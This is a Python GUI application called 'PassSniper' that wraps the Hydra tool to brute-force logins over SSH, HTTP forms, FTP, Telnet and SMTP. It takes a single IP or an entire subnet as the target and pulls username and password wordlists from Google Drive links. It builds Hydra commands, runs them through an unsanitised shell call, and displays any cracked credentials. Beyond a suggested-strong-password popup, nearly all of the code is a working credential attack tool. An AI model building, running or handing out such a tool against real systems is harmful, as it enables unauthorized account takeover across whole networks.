import tkinter as tk
from tkinter import filedialog, messagebox, StringVar, OptionMenu, Text, Scrollbar, Frame
import requests
import os
import subprocess
import random
import string
import threading
import ipaddress
import re

# Google Drive direct download URLs
USERNAMES_URL = "https://drive.google.com/uc?id=1h3Mo7HNxDVE5JW4VS7xKF0jRMlv5wA7k&export=download"
PASSWORDS_URL = "https://drive.google.com/uc?id=13VLVk_4AIevt9qwhYHWZTka_dQSc0Dcw&export=download"

# Function to download file and save it to desktop if not already there
def download_file(url, filename):
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    file_path = os.path.join(desktop_path, filename)
    if os.path.exists(file_path):
        return file_path  # If file already exists, no need to download
    try:
        response = requests.get(url)
        response.raise_for_status()
        with open(file_path, 'wb') as file:
            file.write(response.content)
        return file_path
    except requests.exceptions.RequestException as e:
        messagebox.showerror("Error", f"Failed to download file: {e}")
        return None

# Function to load usernames from URL and save to desktop
def load_usernames():
    file_path = download_file(USERNAMES_URL, "usernames.txt")
    if file_path:
        username_entry.delete(0, tk.END)
        username_entry.insert(0, file_path)

# Function to load passwords from URL and save to desktop
def load_passwords():
    file_path = download_file(PASSWORDS_URL, "passwords.txt")
    if file_path:
        password_entry.delete(0, tk.END)
        password_entry.insert(0, file_path)

# Browse for username file from local machine
def browse_usernames():
    file_path = filedialog.askopenfilename(title="Select Usernames File")
    if file_path:
        username_entry.delete(0, tk.END)
        username_entry.insert(0, file_path)

# Browse for password file from local machine
def browse_passwords():
    file_path = filedialog.askopenfilename(title="Select Passwords File")
    if file_path:
        password_entry.delete(0, tk.END)
        password_entry.insert(0, file_path)

# Function to generate a strong password
def generate_strong_password(length=14):
    charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation
    return ''.join(random.choice(charset) for _ in range(length))

# Function to perform attack using Hydra with session management and SSH error handling
def perform_hydra_attack(ip, username_file, password_file, attack_type, service_type, progress_text, cancel_event):
    command = ""
    # Construct the appropriate Hydra command based on the selected attack and service type
    if attack_type == "Brute Force Attack" or attack_type == "Dictionary Attack":
        if service_type == "SSH":
            command = f"hydra -L {username_file} -P {password_file} -t 64 -vV -f  {ip} ssh"
        elif service_type == "Website (HTTP/HTTPS)":
            command = f"hydra -L {username_file} -P {password_file} -t 64 -vV -f http-form-post://{ip}/login.php:\"username=^USER^&password=^PASS^:F=incorrect\""
        elif service_type == "FTP":
            command = f"hydra -L {username_file} -P {password_file} -t 64 -vV -f {ip} ftp"
        elif service_type == "Telnet":
            command = f"hydra -L {username_file} -P {password_file} -t 64 -vV -f telnet://{ip}"
        elif service_type == "SMTP":
            command = f"hydra -L {username_file} -P {password_file} -vV -f smtp://{ip} -t 32 -w 30"

    # Run the Hydra command as a subprocess and show progress in real time
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    for line in iter(process.stdout.readline, ''):
        if cancel_event.is_set():
            process.terminate()
            break
        # Directly show progress in the attack window
        progress_text.insert(tk.END, line)
        progress_text.see(tk.END)

        # Check if the line contains valid credentials
        valid_creds = re.search(r'login:\s*(\S+)\s*password:\s*(\S+)', line)
        if valid_creds:
            username, password = valid_creds.groups()
            show_result_page(username, password)

    process.stdout.close()
    process.wait()

    if process.returncode == 0:
        result_text = f"Attack completed successfully for {ip}!"
        progress_text.insert(tk.END, result_text)
    else:
        result_text = "Attack failed or was incomplete."
        progress_text.insert(tk.END, result_text)

# Function to handle subnet IP addresses
def perform_attack_on_subnet(subnet, username_file, password_file, attack_type, service_type):
    try:
        network = ipaddress.ip_network(subnet, strict=False)
        for ip in network.hosts():
            perform_hydra_attack(str(ip), username_file, password_file, attack_type, service_type, attack_progress_text, cancel_event)
    except ValueError:
        messagebox.showerror("Input Error", "Invalid subnet range.")

# Function to display the result page
def show_result_page(username, password):
    result_window = tk.Toplevel(root)
    result_window.title("Result")
    result_window.geometry("400x300")
    result_window.configure(bg="#2c3e50")

    header_label = tk.Label(result_window, text="Valid Credentials Found", font=("Helvetica", 16, "bold"), bg="#2c3e50", fg="#ecf0f1")
    header_label.pack(pady=20)

    result_text = Text(result_window, wrap="word", font=("Helvetica", 12), bg="#ecf0f1", fg="#2c3e50", relief="solid", borderwidth=2)
    result_text.pack(pady=10, padx=10, fill="both", expand=True)
    result_text.insert(tk.END, f"Username: {username}\nPassword: {password}")
    result_text.tag_configure("highlight", foreground="#e74c3c", font=("Helvetica", 12, "bold"))

    # Highlighting valid credentials in red
    result_text.tag_add("highlight", "1.0", "end")
    result_text.config(state="disabled")

    strong_password = generate_strong_password()
    advice_label = tk.Label(result_window, text="Please use a strong password.\nSuggested Strong Password:", font=("Helvetica", 12, "italic"), bg="#2c3e50", fg="#ecf0f1")
    advice_label.pack(pady=10)

    strong_password_label = tk.Label(result_window, text=strong_password, font=("Helvetica", 14, "bold"), bg="#ecf0f1", fg="#e74c3c", padx=10, pady=10, relief="solid")
    strong_password_label.pack(pady=10)

# GUI setup with professional look
root = tk.Tk()
root.title("PassSniper")  # Keep the name in the top taskbar
root.geometry("600x500")

# Function to toggle fullscreen
def toggle_fullscreen(event=None):
    root.attributes("-fullscreen", True)
    root.bind("<Escape>", exit_fullscreen)

def exit_fullscreen(event=None):
    root.attributes("-fullscreen", False)

# Cancel event for the attack
cancel_event = threading.Event()

# Main content frame
main_frame = Frame(root, bg="#34495e")
main_frame.pack(fill="both", expand=True, padx=10, pady=10)

# Target IP/Subnet
ip_label = tk.Label(main_frame, text="Target IP/Subnet:", font=("Helvetica", 14), bg="#34495e", fg="#ecf0f1")
ip_label.pack(pady=(10, 0))
ip_entry = tk.Entry(main_frame, font=("Helvetica", 12), relief="solid", borderwidth=2)
ip_entry.pack(pady=5)

# Usernames File
username_label = tk.Label(main_frame, text="Usernames File:", font=("Helvetica", 14), bg="#34495e", fg="#ecf0f1")
username_label.pack(pady=(10, 0))
username_entry = tk.Entry(main_frame, font=("Helvetica", 12), relief="solid", borderwidth=2)
username_entry.pack(pady=5)
load_usernames_button = tk.Button(main_frame, text="Load Usernames", command=load_usernames, font=("Helvetica", 12), bg="#3498db", fg="white")
load_usernames_button.pack(pady=5)
browse_usernames_button = tk.Button(main_frame, text="Browse Usernames", command=browse_usernames, font=("Helvetica", 12), bg="#3498db", fg="white")
browse_usernames_button.pack(pady=5)

# Passwords File
password_label = tk.Label(main_frame, text="Passwords File:", font=("Helvetica", 14), bg="#34495e", fg="#ecf0f1")
password_label.pack(pady=(10, 0))
password_entry = tk.Entry(main_frame, font=("Helvetica", 12), relief="solid", borderwidth=2)
password_entry.pack(pady=5)
load_passwords_button = tk.Button(main_frame, text="Load Passwords", command=load_passwords, font=("Helvetica", 12), bg="#3498db", fg="white")
load_passwords_button.pack(pady=5)
browse_passwords_button = tk.Button(main_frame, text="Browse Passwords", command=browse_passwords, font=("Helvetica", 12), bg="#3498db", fg="white")
browse_passwords_button.pack(pady=5)

# Attack Type and Service Type
attack_type_label = tk.Label(main_frame, text="Attack Type:", font=("Helvetica", 14), bg="#34495e", fg="#ecf0f1")
attack_type_label.pack(pady=(10, 0))
attack_type_var = StringVar(value="Brute Force Attack")
attack_type_option = OptionMenu(main_frame, attack_type_var, "Brute Force Attack", "Dictionary Attack")
attack_type_option.config(font=("Helvetica", 12))
attack_type_option.pack(pady=5)

service_type_label = tk.Label(main_frame, text="Service Type:", font=("Helvetica", 14), bg="#34495e", fg="#ecf0f1")
service_type_label.pack(pady=(10, 0))
service_type_var = StringVar(value="SSH")
service_type_option = OptionMenu(main_frame, service_type_var, "SSH", "Website (HTTP/HTTPS)", "FTP", "Telnet", "SMTP")
service_type_option.config(font=("Helvetica", 12))
service_type_option.pack(pady=5)

# Start Attack button with threading
def start_attack():
    ip = ip_entry.get()
    username_file = username_entry.get()
    password_file = password_entry.get()
    attack_type = attack_type_var.get()
    service_type = service_type_var.get()
    if not ip or not username_file or not password_file:
        messagebox.showerror("Input Error", "Please fill in all fields.")
        return

    # Set the cancel event to False initially
    cancel_event.clear()
    
    # Create a new window for showing the attack process
    attack_window = tk.Toplevel(root)
    attack_window.title("Attack in Progress")
    attack_window.geometry("600x400")
    attack_window.configure(bg="#2c3e50")

    # Create a frame for the Text widget and scrollbar
    frame = Frame(attack_window)
    frame.pack(pady=10, padx=10, fill="both", expand=True)

    global attack_progress_text
    attack_progress_text = Text(frame, height=15, wrap="word", font=("Helvetica", 12), bg="#ecf0f1", fg="#2c3e50", relief="solid", borderwidth=2)
    attack_progress_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

    # Add a scrollbar
    scrollbar = Scrollbar(frame, command=attack_progress_text.yview)
    scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
    attack_progress_text.config(yscrollcommand=scrollbar.set)

    thread = threading.Thread(target=perform_attack_on_subnet, args=(ip, username_file, password_file, attack_type, service_type))
    thread.start()

    # Cancel Attack button
    def cancel_attack():
        cancel_event.set()  # Signal cancellation
        messagebox.showinfo("Info", "Attack has been cancelled.")

    cancel_attack_button = tk.Button(attack_window, text="Cancel Attack", command=cancel_attack, font=("Helvetica", 14), bg="#e74c3c", fg="white")
    cancel_attack_button.pack(pady=20)

# Launch Attack button
start_attack_button = tk.Button(main_frame, text="Launch Attack", command=start_attack, font=("Helvetica", 14), bg="#2ecc71", fg="white")
start_attack_button.pack(pady=10)

# Start the main loop
root.bind("<F11>", toggle_fullscreen)  # Bind F11 key for fullscreen
root.mainloop()

